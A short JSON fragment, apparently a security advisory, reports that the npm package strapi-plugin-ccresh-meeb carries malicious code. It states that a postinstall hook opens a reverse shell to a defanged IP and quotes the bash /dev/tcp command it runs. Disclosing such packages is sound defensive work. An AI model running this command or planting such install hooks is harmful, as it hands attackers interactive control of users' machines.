  "summary": "Malicious code in strapi-plugin-ccresh-meeb (npm)",
  "details": "The package's postinstall hook runs a script that opens a reverse shell to 14[.]225[.]210[.]85:443. It executes `bash -c 'bash -i \u003e /dev/tcp/14[.]225[.]210[.]85/443 0\u003e\u00261'` via child_process.exec on install, giving the remote host an interactive shell on the installer's machine. It also writes a marker file to /tmp to confirm execution.",
